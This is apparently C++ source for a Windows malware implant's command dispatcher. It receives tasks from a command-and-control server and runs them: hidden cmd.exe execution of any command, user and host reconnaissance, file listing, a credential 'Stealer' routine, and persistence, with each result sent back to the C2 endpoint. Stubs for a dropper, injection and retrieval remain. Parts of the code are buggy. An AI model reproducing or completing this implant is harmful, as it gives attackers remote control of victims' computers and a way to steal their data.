#include "execute.h"

/* Directory of Commands
- Persistence_1
- Situational_Awareness
- Stealer
- Execution <arg> - List command to run
- File_Enumeration <arg> - List files in the directory

TODO:
- Retrieval - Is commented out?
- Injection - Will work on it next time
- Dropper

 */
void execute(std::string command, std::string args, int task_id, int implant_id){

    std::string results;
    std::string work = "Yes";

    /* Persistance */
    // only uncomment in sandbox
    if(command.compare("Persistence_1") == 0){
        printf("Executing Persistence\n");
        try{
            results = "executed";
            std::string username = getUserName();
            // persist_execution(getUserName());
        }
        catch(...){
            printf("It did not work.\n");
            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
            work = "No";
        }
        if(work.compare("No") == 1){
            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
        }
        
    }

    /* Situational Awareness */
    if(command.compare("Situational_Awareness") == 0){
        printf("Executing Situational Awareness\n");
        try{
            json results_parse = GetAll();
            results.append(results_parse.at("userName"));
            results.append(results_parse.at("compName"));
            // This works but it doesn't fit in the table
            // results.append(results_parse.at("Privileges"));
            results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
            results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
            std::replace( results.begin(), results.end(), '\\', '/');
            std::replace( results.begin(), results.end(), '-', '_');


        }
        catch(...){
            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
            work = "No";
        }
        if(work.compare("No") == 1){
            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
        }

    }

    /* Execution */
    if(command.compare("Execution") == 0){
        printf("Executing Execution\n");
        try{
            char* c = strcpy(new char[args.length() + 1], args.c_str());
            std::string res = exec(c);
                
            results = res;
            results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
            results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
            std::replace( results.begin(), results.end(), '\\', '/');
            std::replace( results.begin(), results.end(), '-', '_');
        }
        catch(...){
            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
            work = "No";
        }
        if(work.compare("No") == 1){
            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
        }
    }
    
    /* File Enumeration */
    if(command.compare("File_Enumeration") == 0){
        printf("Executing File Enumeration\n");
        try{
            std::string path = args;
            std::string storage =(getFileNamesFromPath(path));

            results = storage;
            results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
            results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
            std::replace( results.begin(), results.end(), '\\', '/');
            std::replace( results.begin(), results.end(), '-', '_');
        }
        catch(...){
            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
            work = "No";
        }
        if(work.compare("No") == 1){
            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
        }
    }
   
    /* Stealer Function */
    if(command.compare("Stealer") == 0){
        try{
            json data_from_driver;
            printf("Executing Stealer\n");
            data_from_driver = driver();
            results = data_from_driver.dump();

        }
         catch(...){
            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
            work = "No";
        }
        if(work.compare("No") == 1){
            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
        }

    }
   
    /* Retrieval */
    // Don't know if this has been plemented
    if(command.compare("Retrieval") ==0 ){
        printf("Executing Retrieval\n");
        //Where we add in SendToC2
    }

    /* Dropper */
    // Our plans for this changed?
    if(command.compare("Dropper") == 0){
        printf("Executing Dropper\n");
        //Dropper();
    }

    /* Injection */
    // Don't know if this works
    if(command.compare("Injection") == 0){
        printf("Executing Injection\n");

    }
    return;
}





std::string exec(char* args){
  
   LPSTR cmd = (char*)malloc(sizeof(args)/sizeof(char)
    + 50);
    sprintf(cmd, "cmd.exe /c %s", args);
    HANDLE hStdOutRead, hStdOutWrite;

    hStdOutRead = GetStdHandle(STD_OUTPUT_HANDLE); 
    if ((hStdOutRead == INVALID_HANDLE_VALUE) || (hStdOutWrite == INVALID_HANDLE_VALUE))
        return FALSE;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
        printf("error creating pipe");
        return FALSE;
    }
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdInput = NULL;
    si.hStdError = hStdOutWrite;
    si.hStdOutput = hStdOutWrite;
    BOOL creationResult = CreateProcessA(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );
    std::string output;
    if (creationResult){
        LPVOID buffer[4096];
        DWORD bytesAvail = 0, bytesRead = 0;
        do {
            do {
            ZeroMemory(buffer, 4096);
            if (!PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvail, NULL)) {
                printf("error peeking at pipe");
                return "";
            }

            if (bytesAvail) {
                if (!ReadFile(hStdOutRead, buffer, 4095, &bytesRead, NULL)) {
                    printf("error reading pipe");
                    return "";
                }
                if (bytesRead) {
                     char *charData = (char*)buffer;
                    output = std::string(charData);
                    
                    //printf("%s", buffer);
                }
            }
        } while (bytesAvail != 0);
    } while (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
    }
    
    return output;
}

/* Unused Code

        // //split on space
        // int i = args.find(" ");
        // char * prog = (char *) malloc(i);
        // for (int j =0; j < i; j++){
        //     prog[j] = args[j];
        // }
        // char * a = (char *) malloc(args.size() - i);
        // for (int k = i; k < args.size(); k++){
        //     a[k] = args[k];
        // }
                    std::stringstream storage;
            for (auto iterator = file_names.begin(); iterator != file_names.end(); iterator++){
                if (iterator != file_names.begin()){
                    storage << " ";
                }
                storage << *iterator;
            }
*/